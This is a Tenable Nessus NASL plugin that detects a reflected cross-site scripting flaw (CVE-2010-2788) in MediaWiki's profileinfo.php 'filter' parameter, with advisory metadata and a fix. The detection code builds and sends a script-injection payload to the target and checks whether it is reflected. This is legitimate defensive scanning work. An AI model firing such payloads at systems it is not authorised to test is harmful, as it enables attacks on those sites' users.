#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(47902);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2015/06/12 22:35:12 $");

  script_cve_id("CVE-2010-2788");
  script_bugtraq_id(42024);
  script_osvdb_id(66652);
  script_xref(name:"Secunia", value:"40740");

  script_name(english:"MediaWiki profileinfo.php 'filter' Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application running on the remote host is affected by a
cross-site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of MediaWiki running on the remote host is affected by a
cross-site scripting vulnerability due to improper validation of
user-supplied input to the 'filter' parameter in the 'profileinfo.php'
script. A remote attacker can exploit this, by tricking a user into
requesting a maliciously crafted URL, to execute arbitrary script code
in the security context of the affected application.

Installations that have the 'wgEnableProfileInfo' setting disabled
are not affected. This setting is disabled by default."
  );
  script_set_attribute(attribute:"see_also", value:"https://bugzilla.wikimedia.org/show_bug.cgi?id=24565");
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?014eb0ca"
  );
  script_set_attribute(attribute:"solution", value:
"Upgrade to MediaWiki 1.15.5 / 1.16.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/07/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/07/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mediawiki:mediawiki");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("mediawiki_detect.nasl");
  script_require_keys("installed_sw/MediaWiki", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "MediaWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];

xss = '"><script>alert("' + SCRIPT_NAME + '-' + unixtime() + ')</script>';
qs = 'filter=' + xss;
expected_output = '<th><a href="?filter=' + xss;

exploited = test_cgi_xss(
  port:port,
  dirs:make_list(dir),
  cgi:'/profileinfo.php',
  qs:qs,
  pass_str:expected_output,
  ctrl_re:'<title>Profiling data</title>',
  low_risk:TRUE
);

if (!exploited)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));
